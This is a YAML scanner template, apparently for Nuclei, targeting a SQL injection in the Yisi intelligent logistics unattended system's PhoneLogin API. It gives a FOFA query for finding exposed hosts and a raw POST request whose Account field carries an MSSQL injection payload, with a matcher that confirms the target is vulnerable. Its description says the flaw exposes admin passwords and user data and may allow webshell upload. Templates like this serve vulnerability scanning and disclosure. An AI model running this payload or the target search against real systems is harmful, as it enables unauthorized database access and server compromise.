id: yisi-PhoneLogin-sql

info:
  name: 易思智能物流无人值守系统 PhoneLogin SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="/api/SingleLogin"
    易思智能物流无人值守系统 PhoneLogin SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247489264&idx=1&sn=2375259ae986fae83ca35293b7b7dc21&chksm=c267a3c3f5102ad50386e225e0af88a335b60cdd3bb27b00b4e19817a4aedaf69ca8dfe71654&token=1526905597&lang=zh_CN#rd
  tags: sql injection


http:
  - raw:
      - |
        POST /api/PhoneLogin/login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        Account=1'%20and%20sys.fn_sqlvarbasetostr(HashBytes('MD5','123'))=1--&Espassword=g5edid4OCFI32C5NPEZeXg%3D%3D

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '202cb962ac59075b964b07152d234b70'
      - type: status
        status: 
          - 200



